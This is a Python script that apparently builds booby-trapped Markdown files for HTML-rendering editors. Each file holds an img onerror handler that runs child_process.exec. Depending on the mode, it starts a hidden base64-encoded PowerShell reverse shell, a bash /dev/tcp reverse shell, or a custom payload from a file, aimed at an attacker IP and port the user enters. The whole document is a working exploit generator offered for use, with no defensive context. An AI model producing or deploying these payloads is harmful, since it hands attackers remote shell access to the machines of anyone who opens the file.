import sys
import base64

def help():
    print("[-] USAGE: {} Platform payload".format(sys.argv[0]))
    print("Linux: {} linux auto/custom".format(sys.argv[0]))
    print("Windows: {} win/windows auto/custom".format(sys.argv[0]))
    print("BLA BLA BLA")
    exit()

def Windows(lhost, lport):
    win_payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    win_payload = win_payload % (lhost, lport)

    win_payload = "powershell -WindowsStyle Hidden -e " + base64.b64encode(win_payload.encode('utf16')[2:]).decode()
    payload = """<img src="#" onerror="top.require('child_process').exec('{}')">""".format(win_payload)

    md_file = open("Windows.md", "w")
    md_file.write(payload)
    md_file.close()
    print("[+] 'Windows.md' File created")

def CustomWindows(customPayload):
    win_payload = open(customPayload, 'r+')
    win_payload = win_payload.read()
    fullpayload = """<img src="#" onerror="top.require('child_process').exec('powershell -WindowsStyle Hidden -e {}')">""".format(base64.b64encode(win_payload.encode('utf16')[2:]).decode())


    md_file = open("Custom_Windows.md", "w")
    md_file.write(fullpayload)
    md_file.close()
    print("[+] 'Custom_Windows.md' File created")

def Linux(lhost, lport):
    payload = """<img src="#" onerror="top.require('child_process').exec('/bin/bash -i >& /dev/tcp/{}/{} 0>&1')">""".format(lhost, lport)

    md_file = open("Linux.md", "w")
    md_file.write(payload)
    md_file.close()
    print("[+] 'Linux.md' File created")

def CustomLinux(customPayload):
    payload = open(customPayload, 'r+')
    payload = payload.read()
    payload = """<img src="#" onerror="top.require('child_process').exec('/bin/bash -c \'{}\'')">""".format(payload)
    md_file = open("note.md", "w")
    md_file.write(payload)
    md_file.close()
    print("[+] 'Linux.md' File created")

try:
    (platform, type) = (sys.argv[1], sys.argv[2])
    if platform == "windows" or platform == "win" and type == "auto":
        lhost = str(input("[+] Attacker IP: "))
        lport = int(input("[+] Listening Port: "))
        Windows(lhost, lport)
    elif platform == "windows" or platform == "win" and type == "custom":
        customPayload = str(input("[+] Powershell Payload path: "))
        CustomWindows(customPayload)

    elif platform == "linux" and type == "auto":
        lhost = str(input("[+] Attacker IP: "))
        lport = int(input("[+] Listening Port: "))
        Linux(lhost, lport)
    elif platform == "linux" and type == "custom":
        customPayload = str(input("[+] Shell Payload path: "))
        CustomLinux(customPayload)
except Exception as e:
    print(e)
    help()